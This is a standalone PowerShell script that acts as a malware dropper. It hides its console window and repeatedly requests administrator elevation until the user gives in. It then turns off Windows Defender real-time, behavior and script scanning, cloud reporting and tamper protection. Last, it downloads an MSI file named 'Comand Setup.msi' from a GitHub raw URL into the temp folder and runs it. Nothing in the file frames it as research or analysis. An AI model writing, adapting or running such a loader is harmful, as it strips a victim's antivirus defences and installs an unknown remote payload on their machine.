# Hide Console Window
Add-Type -Name W -Namespace C -MemberDefinition '[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();[DllImport("User32.dll")] public static extern bool ShowWindow(IntPtr h,int c);' -ErrorAction SilentlyContinue
$w = [C.W]::GetConsoleWindow()
if ($w -ne [IntPtr]::Zero) { [C.W]::ShowWindow($w, 0) | Out-Null }

# ============ ADMIN CHECK + ELEVATION LOOP ============
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    while ($true) {
        try {
            Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -ErrorAction Stop
            break
        } catch {
            Start-Sleep -Seconds 2
        }
    }
    exit
}

# ============ DISABLE REAL-TIME + TAMPER PROTECTION ============
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -MAPSReporting Disabled

# Tamper Protection -> 0
$tp = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"
Set-ItemProperty -Path $tp -Name "TamperProtection" -Value 0 -Force

# ============ DOWNLOAD + RUN MSI ============
$url = "https://github.com/analysisw/test/raw/refs/heads/main/Comand%20Setup.msi"
$out = Join-Path $env:TEMP "Comand Setup.msi"
Invoke-WebRequest -Uri $url -OutFile $out
Start-Process $out
